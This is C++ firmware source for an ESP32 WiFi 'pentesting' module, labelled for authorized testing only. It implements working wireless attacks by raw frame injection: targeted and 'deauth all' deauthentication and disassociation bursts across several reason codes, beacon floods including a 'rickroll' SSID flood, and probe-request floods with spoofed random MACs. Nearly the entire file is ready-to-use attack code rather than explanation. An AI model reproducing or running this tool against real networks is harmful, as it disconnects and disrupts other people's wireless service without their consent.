// ============================================================================
// NeoCAT V1 — WiFi Pentesting Module Implementation
// For authorized security testing only.
// ============================================================================
#include "wifi_module.h"

// (Rickroll lyrics now handled dynamically via _ssidList)

// === Frame templates ===
static uint8_t deauthFrame[26] = {
  0xC0, 0x00, 0x3A, 0x01,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x07, 0x00
};

static uint8_t beaconFrame[128];
static const uint8_t beaconHeader[] = {
  0x80, 0x00, 0x00, 0x00,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x00, 0x00,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0x64, 0x00, 0x31, 0x04
};

static const uint8_t supportedRates[] = {
  0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c
};

static uint8_t probeFrame[128];
static const uint8_t probeHeader[] = {
  0x40, 0x00, 0x00, 0x00,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
  0x00, 0x00
};

// ============================================================================
// Constructor / Destructor
// ============================================================================
WiFiModule::WiFiModule()
  : _currentAttack(ATTACK_NONE), _scanning(false), _packetsSent(0),
    _attackStartTime(0), _deauthTarget(-1), _currentChannel(1),
    _lastPacketTime(0), _currentTargetIndex(0), _currentSSIDIndex(0) {}

WiFiModule::~WiFiModule() {}

// ============================================================================
void WiFiModule::begin() {
  esp_err_t err = esp_wifi_set_promiscuous(true);
  if (err != ESP_OK) {
    Serial.printf("[WiFi] ERROR: promiscuous mode failed: %d\n", err);
  } else {
    Serial.println("[WiFi] Promiscuous mode enabled");
  }
  
  // Test raw frame TX with a harmless beacon
  uint8_t testBeacon[] = {
    0x80, 0x00, 0x00, 0x00,  // Beacon
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // Dest: broadcast
    0x02, 0xCA, 0xFE, 0xBA, 0xBE, 0x01,  // Src: random
    0x02, 0xCA, 0xFE, 0xBA, 0xBE, 0x01,  // BSSID
    0x00, 0x00,  // Seq
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Timestamp
    0x64, 0x00,  // Interval
    0x31, 0x04,  // Capabilities
    0x00, 0x04, 'T', 'E', 'S', 'T',  // SSID: TEST
    0x01, 0x01, 0x82  // Rates
  };
  err = esp_wifi_80211_tx(WIFI_IF_AP, testBeacon, sizeof(testBeacon), false);
  if (err != ESP_OK) {
    Serial.printf("[WiFi] WARNING: Raw TX test failed: %s (%d) — deauth may not work\n",
                  esp_err_to_name(err), err);
  } else {
    Serial.println("[WiFi] Raw TX test OK — frame injection working!");
  }
  
  Serial.println("[WiFi] Module initialized");
}

// ============================================================================
void WiFiModule::update() {
  // Handle async scan completion
  if (_scanning) {
    int result = WiFi.scanComplete();
    if (result >= 0) {
      _scanResults.clear();
      _scanResults.reserve(result);
      for (int i = 0; i < result; i++) {
        ScanResult sr;
        sr.ssid = WiFi.SSID(i);
        sr.bssid = WiFi.BSSIDstr(i);
        memcpy(sr.bssidRaw, WiFi.BSSID(i), 6);
        sr.rssi = WiFi.RSSI(i);
        sr.channel = WiFi.channel(i);
        sr.encryption = WiFi.encryptionType(i);
        sr.selected = false;
        _scanResults.push_back(sr);
      }
      WiFi.scanDelete();
      _scanning = false;
      // Re-enable promiscuous mode (scanning disables it)
      esp_wifi_set_promiscuous(true);
      Serial.printf("[WiFi] Scan complete: %d networks found\n", result);
    }
  }

  if (_currentAttack == ATTACK_NONE) return;
  unsigned long now = millis();

  switch (_currentAttack) {
    case ATTACK_DEAUTH:
      if (now - _lastPacketTime >= 1) {
        _lastPacketTime = now;
        if (_deauthTarget == -1) {
          // Deauth ALL — cycle through targets
          if (_scanResults.size() > 0) {
            int idx = _currentTargetIndex % _scanResults.size();
            _sendDeauthBurst(_scanResults[idx].bssidRaw, _scanResults[idx].channel);
            _currentTargetIndex++;
          }
        } else if (_deauthTarget >= 0 && _deauthTarget < (int)_scanResults.size()) {
          _sendDeauthBurst(_scanResults[_deauthTarget].bssidRaw,
                           _scanResults[_deauthTarget].channel);
        }
        // Restore AP channel so dashboard stays reachable
        esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
      }
      break;

    case ATTACK_BEACON:
      if (now - _lastPacketTime >= 1) {  // Was 5ms — now 1ms for speed
        _lastPacketTime = now;
        // Send ALL beacons on the SAME channel per tick, rotate channel each tick
        _currentChannel = (_currentChannel % 11) + 1;
        esp_wifi_set_channel(_currentChannel, WIFI_SECOND_CHAN_NONE);
        for (size_t i = 0; i < _ssidList.size(); i++) {
          _sendBeaconFrameNoChannelSwitch(_ssidList[i].c_str(), _currentChannel);
        }
        esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
      }
      break;

    case ATTACK_RICKROLL:
      if (now - _lastPacketTime >= 1) {  // Was 5ms — now 1ms for speed
        _lastPacketTime = now;
        _currentChannel = (_currentChannel % 11) + 1;
        esp_wifi_set_channel(_currentChannel, WIFI_SECOND_CHAN_NONE);
        for (size_t i = 0; i < _ssidList.size(); i++) {
          _sendBeaconFrameNoChannelSwitch(_ssidList[i].c_str(), _currentChannel);
        }
        esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
      }
      break;

    case ATTACK_PROBE:
      if (now - _lastPacketTime >= 1) {  // Was 2ms — now 1ms
        _lastPacketTime = now;
        // Send 5 probe requests per tick for higher flood rate
        for (int burst = 0; burst < 5; burst++) {
          char rndSSID[16];
          int len = random(4, 12);
          for (int i = 0; i < len; i++) rndSSID[i] = (char)random(65, 91);
          rndSSID[len] = '\0';
          uint8_t ch = random(1, 12);
          esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
          _sendProbeFrameNoChannelSwitch(rndSSID, ch);
        }
        esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
      }
      break;

    default:
      break;
  }
}

// ============================================================================
// Scanning
// ============================================================================
void WiFiModule::startScan() {
  if (_scanning) return;
  if (_currentAttack != ATTACK_NONE) stopAttack();
  _scanning = true;
  // Disable promiscuous mode for scanning to work
  esp_wifi_set_promiscuous(false);
  WiFi.scanNetworks(true, true);
  Serial.println("[WiFi] Async scan started");
}

bool WiFiModule::isScanning() const { return _scanning; }
int WiFiModule::getScanCount() const { return _scanResults.size(); }

const ScanResult* WiFiModule::getScanResult(int index) const {
  if (index < 0 || index >= (int)_scanResults.size()) return nullptr;
  return &_scanResults[index];
}

void WiFiModule::toggleTarget(int index) {
  if (index >= 0 && index < (int)_scanResults.size())
    _scanResults[index].selected = !_scanResults[index].selected;
}

void WiFiModule::selectAll() {
  for (auto& sr : _scanResults) sr.selected = true;
}

void WiFiModule::deselectAll() {
  for (auto& sr : _scanResults) sr.selected = false;
}

String WiFiModule::getScanResultsJSON() {
  JsonDocument doc;
  JsonArray arr = doc.to<JsonArray>();
  for (size_t i = 0; i < _scanResults.size(); i++) {
    JsonObject obj = arr.add<JsonObject>();
    obj["id"] = i;
    obj["ssid"] = _scanResults[i].ssid;
    obj["bssid"] = _scanResults[i].bssid;
    obj["rssi"] = _scanResults[i].rssi;
    obj["channel"] = _scanResults[i].channel;
    obj["enc"] = _authModeToString(_scanResults[i].encryption);
    obj["selected"] = _scanResults[i].selected;
  }
  String result;
  serializeJson(doc, result);
  return result;
}

// ============================================================================
// Attacks
// ============================================================================
void WiFiModule::startDeauth(int targetIndex) {
  if (targetIndex < 0 || targetIndex >= (int)_scanResults.size()) return;
  stopAttack();
  _deauthTarget = targetIndex;
  _currentAttack = ATTACK_DEAUTH;
  _packetsSent = 0;
  _attackStartTime = millis();
  _lastPacketTime = 0;
  Serial.printf("[WiFi] Deauth on: %s\n", _scanResults[targetIndex].ssid.c_str());
}

void WiFiModule::startDeauthAll() {
  if (_scanResults.empty()) return;
  stopAttack();
  _deauthTarget = -1;
  _currentAttack = ATTACK_DEAUTH;
  _packetsSent = 0;
  _attackStartTime = millis();
  _lastPacketTime = 0;
  Serial.println("[WiFi] Deauth ALL started");
}

void WiFiModule::startBeaconFlood(String ssidList) {
  stopAttack();
  _beaconSSIDs = ssidList;
  _parseSSIDList(ssidList);
  _currentAttack = ATTACK_BEACON;
  _packetsSent = 0;
  _attackStartTime = millis();
  _lastPacketTime = 0;
  Serial.println("[WiFi] Beacon flood started");
}

void WiFiModule::startBeaconRickroll(String lyrics) {
  stopAttack();
  _beaconSSIDs = lyrics;
  _parseSSIDList(lyrics);
  _currentAttack = ATTACK_RICKROLL;
  _packetsSent = 0;
  _attackStartTime = millis();
  _lastPacketTime = 0;
  Serial.printf("[WiFi] Rickroll flood started (%d lines)\n", (int)_ssidList.size());
}

void WiFiModule::startProbeFlood() {
  stopAttack();
  _currentAttack = ATTACK_PROBE;
  _packetsSent = 0;
  _attackStartTime = millis();
  _lastPacketTime = 0;
  Serial.println("[WiFi] Probe flood started");
}

void WiFiModule::stopAttack() {
  if (_currentAttack != ATTACK_NONE)
    Serial.printf("[WiFi] Attack stopped. %u packets sent\n", _packetsSent);
  _currentAttack = ATTACK_NONE;
  _deauthTarget = -1;
  _beaconSSIDs = "";
  _ssidList.clear();
  esp_wifi_set_channel(1, WIFI_SECOND_CHAN_NONE);
}

// ============================================================================
// Status
// ============================================================================
WiFiAttackType WiFiModule::getAttackType() const { return _currentAttack; }
bool WiFiModule::isAttacking() const { return _currentAttack != ATTACK_NONE; }
uint32_t WiFiModule::getPacketsSent() const { return _packetsSent; }

String WiFiModule::getStatusJSON() {
  JsonDocument doc;
  doc["attacking"] = isAttacking();
  doc["scanning"] = _scanning;
  doc["packetsSent"] = _packetsSent;
  doc["scanCount"] = (int)_scanResults.size();

  switch (_currentAttack) {
    case ATTACK_DEAUTH:   doc["attackType"] = "deauth"; break;
    case ATTACK_BEACON:   doc["attackType"] = "beacon"; break;
    case ATTACK_PROBE:    doc["attackType"] = "probe"; break;
    case ATTACK_RICKROLL: doc["attackType"] = "rickroll"; break;
    default:              doc["attackType"] = "none"; break;
  }

  if (isAttacking()) {
    doc["duration"] = (millis() - _attackStartTime) / 1000;
    if (_deauthTarget >= 0 && _deauthTarget < (int)_scanResults.size())
      doc["target"] = _scanResults[_deauthTarget].ssid;
    else if (_deauthTarget == -1 && _currentAttack == ATTACK_DEAUTH)
      doc["target"] = "ALL";
  }

  String result;
  serializeJson(doc, result);
  return result;
}

// ============================================================================
// Private — Frame TX
// ============================================================================
void WiFiModule::_sendDeauthFrame(uint8_t* bssid, uint8_t channel) {
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  memcpy(&deauthFrame[4],  "\xFF\xFF\xFF\xFF\xFF\xFF", 6);
  memcpy(&deauthFrame[10], bssid, 6);
  memcpy(&deauthFrame[16], bssid, 6);
  deauthFrame[22] = (_packetsSent & 0x0F) << 4;
  deauthFrame[23] = (_packetsSent >> 4) & 0xFF;

  esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, sizeof(deauthFrame), false);
  _packetsSent++;

  deauthFrame[0] = 0xA0; // Disassoc
  esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, sizeof(deauthFrame), false);
  _packetsSent++;
  deauthFrame[0] = 0xC0; // Reset
}

// Aggressive deauth burst — sends 20+ frames with varied reason codes
void WiFiModule::_sendDeauthBurst(uint8_t* bssid, uint8_t channel) {
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  
  // Reason codes that work best for disconnecting
  static const uint8_t reasons[] = {
    0x01,  // Unspecified reason
    0x02,  // Previous auth no longer valid
    0x03,  // Station leaving BSS
    0x04,  // Inactivity timer
    0x05,  // AP unable to handle all stations
    0x06,  // Class 2 frame from non-authenticated station
    0x07,  // Class 3 frame from non-associated station
    0x08,  // Station leaving BSS (disassoc)
  };
  
  // Send burst of deauth frames: AP → broadcast (all clients)
  for (int r = 0; r < 8; r++) {
    deauthFrame[0] = 0xC0;  // Deauth
    memcpy(&deauthFrame[4],  "\xFF\xFF\xFF\xFF\xFF\xFF", 6);  // Dst: broadcast
    memcpy(&deauthFrame[10], bssid, 6);                        // Src: AP
    memcpy(&deauthFrame[16], bssid, 6);                        // BSSID
    deauthFrame[22] = (_packetsSent & 0x0F) << 4;
    deauthFrame[23] = (_packetsSent >> 4) & 0xFF;
    deauthFrame[24] = reasons[r];  // Reason code
    deauthFrame[25] = 0x00;
    
    esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, sizeof(deauthFrame), false);
    _packetsSent++;
  }
  
  // Send disassoc frames too
  for (int r = 0; r < 4; r++) {
    deauthFrame[0] = 0xA0;  // Disassoc
    memcpy(&deauthFrame[4],  "\xFF\xFF\xFF\xFF\xFF\xFF", 6);
    memcpy(&deauthFrame[10], bssid, 6);
    memcpy(&deauthFrame[16], bssid, 6);
    deauthFrame[22] = (_packetsSent & 0x0F) << 4;
    deauthFrame[23] = (_packetsSent >> 4) & 0xFF;
    deauthFrame[24] = reasons[r];
    deauthFrame[25] = 0x00;
    
    esp_wifi_80211_tx(WIFI_IF_AP, deauthFrame, sizeof(deauthFrame), false);
    _packetsSent++;
  }
  
  deauthFrame[0] = 0xC0;  // Reset to deauth type
}

void WiFiModule::_sendBeaconFrame(const char* ssid, uint8_t channel) {
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  int ssidLen = strlen(ssid);
  if (ssidLen > 32) ssidLen = 32;

  int pos = 0;
  memcpy(beaconFrame, beaconHeader, sizeof(beaconHeader));
  pos = sizeof(beaconHeader);

  uint8_t mac[6];
  _generateRandomMAC(mac);
  memcpy(&beaconFrame[10], mac, 6);
  memcpy(&beaconFrame[16], mac, 6);
  beaconFrame[22] = (_packetsSent & 0x0F) << 4;
  beaconFrame[23] = (_packetsSent >> 4) & 0xFF;

  beaconFrame[pos++] = 0x00;
  beaconFrame[pos++] = ssidLen;
  memcpy(&beaconFrame[pos], ssid, ssidLen);
  pos += ssidLen;

  memcpy(&beaconFrame[pos], supportedRates, sizeof(supportedRates));
  pos += sizeof(supportedRates);

  beaconFrame[pos++] = 0x03;
  beaconFrame[pos++] = 0x01;
  beaconFrame[pos++] = channel;

  esp_wifi_80211_tx(WIFI_IF_AP, beaconFrame, pos, false);
  _packetsSent++;
}

void WiFiModule::_sendProbeFrame(const char* ssid, uint8_t channel) {
  esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
  int ssidLen = strlen(ssid);
  if (ssidLen > 32) ssidLen = 32;

  int pos = 0;
  memcpy(probeFrame, probeHeader, sizeof(probeHeader));
  pos = sizeof(probeHeader);

  uint8_t mac[6];
  _generateRandomMAC(mac);
  memcpy(&probeFrame[10], mac, 6);
  probeFrame[22] = (_packetsSent & 0x0F) << 4;
  probeFrame[23] = (_packetsSent >> 4) & 0xFF;

  probeFrame[pos++] = 0x00;
  probeFrame[pos++] = ssidLen;
  memcpy(&probeFrame[pos], ssid, ssidLen);
  pos += ssidLen;

  memcpy(&probeFrame[pos], supportedRates, sizeof(supportedRates));
  pos += sizeof(supportedRates);

  esp_wifi_80211_tx(WIFI_IF_AP, probeFrame, pos, false);
  _packetsSent++;
}

// Fast variants — caller manages channel switching for batch operations
void WiFiModule::_sendBeaconFrameNoChannelSwitch(const char* ssid, uint8_t channel) {
  int ssidLen = strlen(ssid);
  if (ssidLen > 32) ssidLen = 32;

  int pos = 0;
  memcpy(beaconFrame, beaconHeader, sizeof(beaconHeader));
  pos = sizeof(beaconHeader);

  uint8_t mac[6];
  _generateRandomMAC(mac);
  memcpy(&beaconFrame[10], mac, 6);
  memcpy(&beaconFrame[16], mac, 6);
  beaconFrame[22] = (_packetsSent & 0x0F) << 4;
  beaconFrame[23] = (_packetsSent >> 4) & 0xFF;

  beaconFrame[pos++] = 0x00;
  beaconFrame[pos++] = ssidLen;
  memcpy(&beaconFrame[pos], ssid, ssidLen);
  pos += ssidLen;

  memcpy(&beaconFrame[pos], supportedRates, sizeof(supportedRates));
  pos += sizeof(supportedRates);

  beaconFrame[pos++] = 0x03;
  beaconFrame[pos++] = 0x01;
  beaconFrame[pos++] = channel;

  esp_wifi_80211_tx(WIFI_IF_AP, beaconFrame, pos, false);
  _packetsSent++;
}

void WiFiModule::_sendProbeFrameNoChannelSwitch(const char* ssid, uint8_t channel) {
  int ssidLen = strlen(ssid);
  if (ssidLen > 32) ssidLen = 32;

  int pos = 0;
  memcpy(probeFrame, probeHeader, sizeof(probeHeader));
  pos = sizeof(probeHeader);

  uint8_t mac[6];
  _generateRandomMAC(mac);
  memcpy(&probeFrame[10], mac, 6);
  probeFrame[22] = (_packetsSent & 0x0F) << 4;
  probeFrame[23] = (_packetsSent >> 4) & 0xFF;

  probeFrame[pos++] = 0x00;
  probeFrame[pos++] = ssidLen;
  memcpy(&probeFrame[pos], ssid, ssidLen);
  pos += ssidLen;

  memcpy(&probeFrame[pos], supportedRates, sizeof(supportedRates));
  pos += sizeof(supportedRates);

  esp_wifi_80211_tx(WIFI_IF_AP, probeFrame, pos, false);
  _packetsSent++;
}

void WiFiModule::_generateRandomMAC(uint8_t* mac) {
  for (int i = 0; i < 6; i++) mac[i] = random(0, 256);
  mac[0] = (mac[0] & 0xFE) | 0x02;
}

void WiFiModule::_parseBSSID(const String& bssidStr, uint8_t* out) {
  int v[6];
  if (sscanf(bssidStr.c_str(), "%x:%x:%x:%x:%x:%x",
             &v[0], &v[1], &v[2], &v[3], &v[4], &v[5]) == 6) {
    for (int i = 0; i < 6; i++) out[i] = (uint8_t)v[i];
  } else {
    memset(out, 0, 6);
  }
}

const char* WiFiModule::_authModeToString(wifi_auth_mode_t mode) {
  switch (mode) {
    case WIFI_AUTH_OPEN:            return "OPEN";
    case WIFI_AUTH_WEP:             return "WEP";
    case WIFI_AUTH_WPA_PSK:         return "WPA";
    case WIFI_AUTH_WPA2_PSK:        return "WPA2";
    case WIFI_AUTH_WPA_WPA2_PSK:    return "WPA/2";
    case WIFI_AUTH_WPA3_PSK:        return "WPA3";
    case WIFI_AUTH_WPA2_ENTERPRISE: return "WPA2E";
    default:                        return "OTHER";
  }
}

void WiFiModule::_parseSSIDList(const String& list) {
  _ssidList.clear();
  int start = 0;
  while (start < (int)list.length()) {
    int end = list.indexOf('\n', start);
    if (end == -1) end = list.length();
    String s = list.substring(start, end);
    s.trim();
    if (s.length() > 0) _ssidList.push_back(s);
    start = end + 1;
  }
}
